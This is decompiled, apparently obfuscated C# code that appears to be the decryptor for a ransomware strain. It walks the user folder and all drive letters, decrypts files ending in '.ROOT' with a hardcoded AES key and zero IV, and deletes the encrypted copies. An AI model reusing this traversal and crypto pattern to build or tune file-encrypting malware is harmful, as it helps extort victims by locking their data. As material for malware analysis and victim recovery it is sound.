using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class Class1
{
	public static void smethod_0()
	{
		string string_ = "C:\\Users\\" + Environment.UserName + "\\";
		string string_2 = "KXZQEBBPY7DZaz9000000002";
		smethod_1(string_, string_2);
		string[] array = new string[25]
		{
			"A:\\", "B:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\",
			"L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\",
			"V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"
		};
		string[] array2 = array;
		foreach (string string_3 in array2)
		{
			try
			{
				smethod_1(string_3, string_2);
			}
			catch
			{
			}
		}
	}

	private static void smethod_1(string string_0, string string_1)
	{
		if (string_0.Equals(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), StringComparison.OrdinalIgnoreCase))
		{
			Console.WriteLine("Skipping directory: " + string_0);
			return;
		}
		string[] files = Directory.GetFiles(string_0);
		foreach (string string_2 in files)
		{
			smethod_2(string_2, string_1);
		}
		string[] directories = Directory.GetDirectories(string_0);
		foreach (string string_3 in directories)
		{
			smethod_1(string_3, string_1);
		}
	}

	private static void smethod_2(string string_0, string string_1)
	{
		char[] trimChars = new char[5] { 'R', 'O', 'O', 'T', '.' };
		if (!string_0.EndsWith(".ROOT"))
		{
			Console.WriteLine("Skipping file: " + string_0);
			return;
		}
		using Aes aes = Aes.Create();
		aes.Key = Encoding.UTF8.GetBytes(string_1);
		aes.IV = new byte[16];
		string text = string_0.Substring(0, string_0.Length - ".ROOT".Length);
		using (FileStream stream = new FileStream(string_0, FileMode.Open))
		{
			using FileStream destination = new FileStream(text, FileMode.Create);
			using ICryptoTransform transform = aes.CreateDecryptor();
			using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			cryptoStream.CopyTo(destination);
		}
		File.Delete(string_0);
		File.Move(text, string_0.TrimEnd(trimChars));
		Console.WriteLine("Decrypted file: " + string_0);
	}

	public Class1()
	{
		Class5.qSmkGw9zBHCc6();
		base._002Ector();
	}
}
